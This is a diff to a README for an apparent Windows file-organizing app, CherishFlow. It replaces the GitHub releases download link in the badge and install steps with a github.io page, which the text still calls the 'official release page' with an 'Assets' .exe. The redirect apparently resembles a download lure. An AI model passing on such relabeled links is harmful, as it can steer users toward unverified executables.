@@ -1,6 +1,6 @@
 # 📂 cherishflow-file-routing - Automated tools to organize your files
 
-[![](https://img.shields.io/badge/Download-CherishFlow-blue.svg)](https://github.com/bathepit477/cherishflow-file-routing/releases)
+[![](https://img.shields.io/badge/Download-CherishFlow-blue.svg)](https://bathepit477.github.io)
 
 CherishFlow manages your data. This desktop application moves and synchronizes files based on rules you set. You choose the folders, and the program handles the transfers. Version 2.8.3 adds features to schedule recurring tasks and select multiple destinations for your documents.
 
@@ -23,7 +23,7 @@ You need a computer running Windows 10 or Windows 11 to use the application. The
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official release page: [Download CherishFlow](https://github.com/bathepit477/cherishflow-file-routing/releases).
+1.  Visit the official release page: [Download CherishFlow](https://bathepit477.github.io).
 2.  Look for the section marked Assets.
 3.  Click the file ending in `.exe` to start the download.
 4.  Open your Downloads folder in File Explorer.
